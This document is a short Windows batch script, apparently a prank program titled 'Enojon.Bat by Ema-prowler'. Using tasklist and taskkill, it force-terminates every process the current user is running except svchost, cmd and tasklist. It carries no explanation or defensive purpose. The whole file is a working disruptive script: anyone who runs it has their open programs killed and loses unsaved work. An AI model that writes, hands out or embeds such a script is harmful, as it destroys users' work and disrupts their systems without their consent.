@echo off
title Enojon.Bat by Ema-prowler  -_-"
cd c:\windows\System32
for /f "skip=3 tokens=1" %%i in ('TASKLIST /FI "USERNAME eq %userdomain%\%username%" /FI "STATUS eq running"') do (
if not "%%i"=="svchost.exe" (
if not "%%i"=="cmd.exe" (
if not "%%i"=="tasklist.exe" (
echo.
taskkill /f /im "%%i"
echo.
)
)
)
)
pause